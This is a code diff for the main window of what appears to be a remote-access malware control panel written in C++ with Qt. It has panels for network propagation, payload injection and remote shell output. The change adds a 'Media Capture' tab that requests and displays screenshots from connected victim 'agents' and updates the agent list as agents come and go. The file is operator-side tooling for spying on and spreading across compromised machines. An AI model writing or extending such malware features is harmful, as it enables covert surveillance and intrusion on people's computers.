@@ -7,6 +7,7 @@
 #include "../../include/ui/components/CommandDialog.hpp"
 #include "../../include/ui/components/PropagationPanel.hpp"
 #include "../../include/ui/components/InjectionPanel.hpp"
+#include "../../include/ui/components/MediaPanel.hpp"
 #include "../../include/ui/StyleSheets.hpp"
 #include "../../include/database/Inferno_Database.hpp"
 #include "../../include/services/IntelAnalysisService.hpp"
@@ -98,6 +99,14 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
         onStatusMessage(QString("Injection sent: %1 → %2").arg(ip, targetPath));
     });
     connect(m_server, &Server::injectResultReceived, m_injectionPanel, &InjectionPanel::onInjectResult);
+
+    // Screenshot: bridge Capture button → server
+    connect(m_mediaPanel, &MediaPanel::screenshotRequested, this, [this](const QString& ip) {
+        m_server->sendScreenshotCommand(ip);
+        onStatusMessage(QString("Screenshot requested from %1").arg(ip));
+    });
+    connect(m_server, &Server::screenshotReceived, m_mediaPanel, &MediaPanel::displayScreenshot);
+    connect(m_mediaPanel, &MediaPanel::statusMessage, this, &MainWindow::onStatusMessage);
 
     // Connect Business Logic Service for real-time notification updates
     connect(&IntelAnalysisService::instance(), &IntelAnalysisService::intelligenceUpdated, this, &MainWindow::handleIntelligenceUpdated);
@@ -209,6 +218,10 @@ void MainWindow::setupUI() {
     m_propagationPanel = new PropagationPanel(this);
     m_tabWidget->addTab(m_propagationPanel, "Network Propagation");
 
+    // Tab 5: Media Capture Panel (Phase 4D)
+    m_mediaPanel = new MediaPanel(this);
+    m_tabWidget->addTab(m_mediaPanel, "Media Capture");
+
     mainSplitter->addWidget(m_tabWidget);
     mainSplitter->setStretchFactor(0, 1);
     mainSplitter->setStretchFactor(1, 4);
@@ -279,6 +292,12 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
     
     m_telemetryPanel->appendText(QString("[SYSTEM] New connection established from %1").arg(ip));
     m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
+
+    // Update MediaPanel agent list
+    QStringList ips;
+    for (int i = 0; i < m_agentList->count(); ++i)
+        ips.append(m_agentList->item(i)->data(Qt::UserRole).toString());
+    m_mediaPanel->setAgentList(ips);
 }
 
 void MainWindow::onAgentDisconnected(const QString& ip) {
@@ -296,6 +315,12 @@ void MainWindow::onAgentDisconnected(const QString& ip) {
     }
     m_telemetryPanel->appendText(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
     m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
+
+    // Update MediaPanel agent list
+    QStringList ips;
+    for (int i = 0; i < m_agentList->count(); ++i)
+        ips.append(m_agentList->item(i)->data(Qt::UserRole).toString());
+    m_mediaPanel->setAgentList(ips);
 }
 
 void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
